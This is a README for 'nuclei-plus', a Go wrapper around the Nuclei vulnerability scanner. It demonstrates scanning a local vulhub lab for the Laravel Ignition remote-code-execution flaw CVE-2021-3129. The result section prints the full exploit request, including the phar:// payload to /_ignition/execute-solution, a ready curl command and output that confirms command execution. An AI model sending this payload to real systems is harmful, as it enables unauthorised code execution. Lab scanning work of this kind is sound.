# nuclei-plus

- Allows Golang to call Nuclei directly to get scan results


## Case: use nuclei-plus scan CVE-2021-3129

```shell
cd /opt
# clone vulhub
git clone https://github.com/vulhub/vulhub.git

# start CVE-2021-3129 env
cd /opt/vulhub/laravel/CVE-2021-3129/
docker-compose build
docker-compose up -d

# web
http://192.168.126.128:8080

# use nuclei tool to scan
nuclei -u "http://192.168.126.128:8080" -t "/root/nuclei-templates/cves/2021/CVE-2021-3129.yaml"
```

then use nucleiplus to scan CVE-2021-3129:

```go
package main

import (
	"fmt"

	"github.com/projectdiscovery/goflags"
	"github.com/projectdiscovery/nuclei/v2/pkg/output"
	"github.com/projectdiscovery/nuclei/v2/pkg/testutils"

	nucleiplus "nuclei-plus"
)

func main() {
	// download config & templates
	nucleiplus.Setup()

	// targets
	targets := []string{
		"http://192.168.126.128:8080",
	}

	// template
	templatePaths := []string{"/root/nuclei-templates/cves/2021/CVE-2021-3129.yaml"}
	debug := false
	excludeTags := goflags.StringSlice{"dos", "misc"}

	// output
	results := make([]*output.ResultEvent, 0)
	outputWriter := testutils.NewMockOutputWriter()
	outputWriter.WriteCallback = func(event *output.ResultEvent) {
		if len(event.Response) > 10240 {
			event.Response = event.Response[:10240]
		}
		results = append(results, event)
	}

	for _, target := range targets {
		nucleiplus.Nuclei(outputWriter, target, templatePaths, debug, excludeTags)
	}

	// result
	for _, info := range results {
		fmt.Println(info)
	}
}
```

result:

```shell
INFO[0000] nuclei templates is ready: /root/nuclei-templates 
&{  CVE-2021-3129 /root/nuclei-templates/cves/2021/CVE-2021-3129.yaml {Laravel with Ignition <= v8.4.2 Debug Mode - Remote Code Execution z3bd, pdteam cve, cve2021, laravel, rce, vulhub Laravel version 8.4.2 and before with Ignition before 2.5.2 allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2. https://www.ambionics.io/blog/laravel-debug-rce, https://github.com/vulhub/vulhub/tree/master/laravel/cve-2021-3129, https://nvd.nist.gov/vuln/detail/cve-2021-3129, https://github.com/facade/ignition/pull/334 {critical} map[] 0xc0004e8820 }   http http://192.168.126.128:8080  http://192.168.126.128:8080/_ignition/execute-solution [uid=33(www-data) gid=33(www-data) groups=33(www-data)] POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.126.128:8080
User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36
Connection: close
Content-Length: 183
Accept: application/json
Content-Type: application/json
Accept-Encoding: gzip

{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "cve20213129", "viewFile": "phar://../storage/logs/laravel.log/test.txt"}}  map[] 192.168.126.128 2023-04-11 15:35:17.11088616 +0800 CST m=+1.080229786 <nil> curl -X 'POST' -d '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "cve20213129", "viewFile": "phar://../storage/logs/laravel.log/test.txt"}}' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Host: 192.168.126.128:8080' -H 'User-Agent: Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36' 'http://192.168.126.128:8080/_ignition/execute-solution' true [] map[]}
```